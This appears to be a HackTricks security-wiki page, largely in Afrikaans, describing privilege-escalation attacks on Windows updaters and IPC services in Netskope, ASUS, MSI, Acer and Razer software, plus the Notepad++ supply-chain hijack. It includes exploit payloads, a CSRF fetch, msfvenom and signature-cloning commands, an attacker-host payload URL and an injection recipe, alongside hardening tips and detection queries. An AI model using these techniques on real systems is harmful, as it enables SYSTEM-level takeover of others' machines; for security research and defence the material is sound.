# Misbruik van Enterprise Auto-Updaters en Bevoorregte IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen 'n klas van Windows local privilege escalation-kettings wat in enterprise endpoint agents en updaters voorkom en wat 'n lae-wrywing IPC-oppervlak en 'n bevoorregte opdateringsvloei blootstel. 'n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar 'n laag-bevoorregte gebruiker die inskrywing na 'n aanvaller-beheerste bediener kan afdwing en dan 'n kwaadwillige MSI lewer wat die SYSTEM-diens installeer.

Belangrike idees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik 'n bevoorregte diens se localhost IPC om her-inskrywing of herkonfigurasie na 'n aanvaller-bediener af te dwing.
- Implementeer die vendor se update-endpoints, lewer 'n skelmmatige Trusted Root CA, en wys die updater na 'n kwaadwillige, “gesigneerde” pakket.
- Ontduik swakke signer checks (CN allow-lists), opsionele digest-vlae, en losbandige MSI-eienskappe.
- As IPC “encrypted” is, lei die key/IV af uit wêreld-lesbare masjien-identifiseerders wat in die registry gestoor is.
- As die diens oproepers beperk volgens image path/process name, injecteer in 'n allow-listed proses of spawn een in suspended state en bootstrap jou DLL via 'n minimale thread-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Baie agents bevat 'n user-mode UI-proses wat oor localhost TCP met 'n SYSTEM-diens praat en JSON gebruik.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Uitbuitingsvloei:
1) Skep 'n JWT enrollment token waarvan die claims die backend-host beheer (bv. AddonUrl). Gebruik alg=None sodat geen handtekening vereis is nie.
2) Stuur die IPC-boodskap wat die provisioning command aanroep met jou JWT en tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou skelm-bediener vir enrollment/config te kontak, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- As caller-verifikasie pad/naam-gebaseer is, laat die versoek afkomstig wees van 'n verkoper-uitvoerbare lêer wat op die witlys is (sien §4).

---
## 2) Kaap die update channel om code as SYSTEM uit te voer

Sodra die kliënt met jou bediener praat, implementeer die verwagte endpoints en stuur dit na 'n aanvaller-MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee 'n JSON-config terug met 'n baie kort opdateringsinterval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Omseil algemene kontroles wat in die veld gesien word:
- Signer CN allow-list: die diens mag slegs nagaan dat die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou skelm-CA kan 'n leaf met daardie CN uitreik en die MSI teken.
- CERT_DIGEST property: sluit 'n onskadelike MSI-eienskap met die naam CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Optional digest enforcement: konfig-vlag (bv., check_msi_digest=false) deaktiveer ekstra kriptografiese validering.

Resultaat: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre kode uit as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Reversing het getoon dat AES met key/IV afgelei is van registerwaardes wat deur enige gebruiker gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die enkripsie reproduseer en geldige geënkripteerde opdragte vanaf 'n standaard gebruiker stuur. Algemene wenk: as 'n agent skielik sy IPC “encrypts”, kyk vir device IDs, product GUIDs, install IDs onder HKLM as materiaal.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Sommige dienste probeer die peer verifieer deur die TCP-verbinding se PID op te los en die image pad/naam te vergelyk met allow-listed vendor binaries geleë onder Program Files (bv., stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL injection in 'n allow-listed proses (bv., nsdiag.exe) en proxy IPC van binne daarvan.
- Spawn 'n allow-listed binary in suspended state en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om driver-afgedwonge tamper-reëls te bevredig.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkte verskaf dikwels 'n minifilter/OB callbacks driver (bv., Stadrv) om gevaarlike regte van handles na beskermde prosesse af te knyp:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user-mode loader wat hierdie beperkinge respekteer:
1) CreateProcess van 'n vendor binary met CREATE_SUSPENDED.
2) Verkry handles wat jy steeds mag hê: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en 'n thread-handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy kode by 'n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of 'n ander vroeë, gewaarborg gemapte thunk) met 'n klein stub wat LoadLibraryW op jou DLL-pad roep, en dan terug spring.
4) ResumeThread om jou stub in-proses te trigger en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME gebruik het op 'n reeds-beskermde proses nie (jy het dit geskep), word die driver se beleid bevredig.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) outomatiseer 'n skelm-CA, kwaadwillige MSI-teken en bedien die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is 'n pasgemaakte IPC-kliënt wat arbitraire (opsioneel AES-encrypted) IPC-boodskappe saamstel en die suspended-process injectie insluit sodat dit van 'n allow-listed binary afkomstig is.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Wanneer jy voor 'n nuwe endpoint-agent of motherboard “helper” suite staan, is 'n vinnige werkvloei meestal genoeg om te bepaal of jy na 'n belowende privesc-doel kyk:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Lys kandidaat named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Ontgin register-ondersteunde routeringsdata wat deur plugin-gebaseerde IPC-bedieners gebruik word:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Haal eers endpoint names, JSON keys en command IDs uit die user-mode client. Gepakte Electron/.NET frontends leak dikwels die volledige schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
As die teiken oproepers slegs verifieer op grond van PID, image path of process name, behandel dit as 'n snelheidsdrempel eerder as 'n grens: injekteer in die regmatige kliënt, of maak die verbinding vanaf 'n toegelate proses — dit is dikwels genoeg om aan die server se kontroles te voldoen. Vir named pipes spesifiek, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) dek die primitief in meer diepte.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub lewer 'n user-mode HTTP service (ADU.exe) op 127.0.0.1:53000 wat browser-oproepe vanaf https://driverhub.asus.com verwag. Die origin-filter voer eenvoudig `string_contains(".asus.com")` uit oor die Origin header en oor download URLs wat deur `/asus/v1.0/*` blootgestel word. Enige attacker-controlled host soos `https://driverhub.asus.com.attacker.tld` slaag dus die kontrole en kan state-changing requests vanaf JavaScript uitstuur. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Registreer 'n domein wat `.asus.com` insluit en host 'n kwaadwillige webblad daar.
2) Gebruik `fetch` of XHR om 'n privileged endpoint (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON body wat deur die handler verwag word – die gepakte frontend JS wys die skema hieronder.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI wat hieronder getoon word, slaag wanneer die Origin header spoofed word na die vertroude waarde:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Enige blaaierversoek na die aanvallerswebwerf word dus `n 1-klik (of 0-klik via `onload`) plaaslike CSRF wat `n SYSTEM-helper aandryf.

---
## 2) Onveilige kode-ondertekeningsverifikasie & sertifikaat-kloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre uitvoerbare lêers af wat in die JSON-body gedefinieer is en cache dit in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die validering van die Download URL hergebruik dieselfde substring-logika, so `http://updates.asus.com.attacker.tld:8000/payload.exe` word aanvaar. Na aflaai kyk ADU.exe slegs of die PE `n handtekening bevat en of die Subject-string met ASUS ooreenstem voordat dit dit uitvoer – geen `WinVerifyTrust`, geen kettingverifikasie nie.

Om die vloei te misbruik:
1) Skep `n payload (bv., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloon ASUS se signer daarin (bv., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` op `n .asus.com`-naloopdomein en trigger UpdateApp via die browser CSRF hierbo.

Omdat beide die Origin- en URL-filters substring-gebaseerd is en die signer-check slegs string-vergelykings doen, trek DriverHub die aanvallers-binary en voer dit uit onder sy verhoogde konteks.

---
## 1) TOCTOU binne updater copy/execute-paadjies (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-diens openbaar `n TCP-protokol waar elke raam `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Die kernkomponent (Component ID `0f 27 00 00`) verskaf `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy hanteraar:
1) Kopieer die aangelewerde uitvoerbare na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die handtekening via `CS_CommonAPI.EX_CA::Verify` (sertifikaat-subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` slaag).
3) Skep `n geskeduleerde taak wat die temp-lêer as SYSTEM met aanvallers-beheerde argumente uitvoer.

Die gekopieerde lêer word nie gesluit tussen verifikasie en `ExecuteTask()` nie. `n Aanvaller kan:
- Stuur Frame A wat na `n legitieme MSI-ondertekende binary wys (verseker dat die handtekeningkontrole slaag en die taak in die ry geplaas word).
- Wedren teen dit met herhaalde Frame B-boodskappe wat na `n kwaadwillige payload wys, en oorskryf `MSI Center SDK.exe` net ná voltooiing van die verifikasie.

Wanneer die skeduleerder afgaan, voer dit die oorgeteweerde payload onder SYSTEM uit ondanks dat die oorspronklike lêer gevalideer is. Betroubare uitbuiting gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spameer totdat die TOCTOU-venster gewen word.

---
## 2) Misbruik van pasgemaakte SYSTEM-vlak IPC & impersonasie (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang `n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 bytes van `n raam kies daardie komponent, wat aanvallers toelaat om opdragte na arbitrêre modules te stuur.
- Plugins kan hul eie taaklopers definieer. `Support\API_Support.dll` openbaar `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` en roep direk `API_Support.EX_Task::ExecuteTask()` met **geen handtekeningverifikasie** nie – enige plaaslike gebruiker kan dit op `C:\Users\<user>\Desktop\payload.exe` wys en deterministies SYSTEM-uitvoering kry.
- Sniffing loopback met Wireshark of instrumentering van die .NET-binaries in dnSpy openbaar vinnig die Component ↔ command-kaart; pasgemaakte Go/Python-kliente kan dan rame herhaal.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) openbaar `\\.\pipe\treadstone_service_LightMode`, en sy diskresionêre ACL laat afstandskliënte toe (bv., `\\TARGET\pipe\treadstone_service_LightMode`). Die stuur van command ID `7` met `n lêerpad roep die diens se proses-spawningsroetine aan.
- Die kliëntbiblioteek serialiseer `n magic terminator byte (113) saam met args. Dinamiese instrumentering met Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) wys dat die native hanteraar hierdie waarde na `n `SECURITY_IMPERSONATION_LEVEL` en integriteit-SID map voordat `CreateProcessAsUser` geroep word.
- Deur 113 (`0x71`) met 114 (`0x72`) te ruil val dit in die generiese tak wat die volle SYSTEM-token behou en `n hoë-integriteit SID (`S-1-16-12288`) stel. Die geskepte binary word dus as onbeperkte SYSTEM uitgevoer, beide lokaal en oor masjiene.
- Kombineer dit met die blootgestelde installer-vlag (`Setup.exe -nocheck`) om ACC selfs op lab-VMs op te stel en die pipe te toets sonder vendor-hardware.

Hierdie IPC-bugs beklemtoon waarom localhost-dienste wedersydse verifikasie moet afdwing (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) en waarom elke module se “run arbitrary binary” helper dieselfde signer-verifikasies moet deel.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 het nog `n nuttige patroon aan hierdie familie bygevoeg: `n laaggeprivilegieerde gebruiker kan `n COM-helper vra om `n proses deur `RzUtility.Elevator` te begin, terwyl die vertrouensoordeel gedelegeer word aan `n user-mode DLL (`simple_service.dll`) eerder as om dit robuust binne die geprivilegieerde grens af te dwing.

Waargenome uitbuitingspad:
- Instansieer die COM-voorwerp `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om `n verhoogde launch te versoek.
- In die publieke PoC is die PE-handtekeninghek binne `simple_service.dll` uitgepatch voordat die versoek gemaak word, wat toelaat dat `n arbitrêre deur die aanvaller gekose uitvoerbare lêer gestart word.

Minimale PowerShell-aanroep:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: wanneer jy “helper” suites reverse, moenie by localhost TCP of named pipes ophou nie. Check vir COM classes met name soos `Elevator`, `Launcher`, `Updater`, of `Utility`, en verify of die privileged service werklik die target binary self validate of slegs 'n resultaat vertrou wat deur 'n patchable user-mode client DLL bereken is. Hierdie patroon generaliseer buite Razer: any split design waar die high-privilege broker 'n allow/deny decision van die low-privilege side consume, is 'n kandidaat privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Older WinGUp-based Notepad++ updaters het nie die update authenticity volledig verifieer nie. Wanneer attackers die hosting provider vir die update server compromise het, kon hulle die XML manifest tamper en slegs gekose clients na attacker URLs redirect. Omdat die client enige HTTPS response aanvaar het sonder om beide 'n trusted certificate chain en 'n geldige PE signature af te dwing, het victims 'n trojanized NSIS `update.exe` fetched en executed.

Operasionele vloei (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat 'n nie-Notepad++-installasieprogram begin</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Hierdie patrone generaliseer na enige updater wat unsigned manifests aanvaar of versuim om installer signers te pin—network hijack + malicious installer + BYO-signed sideloading lewer remote code execution onder die skyn van “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
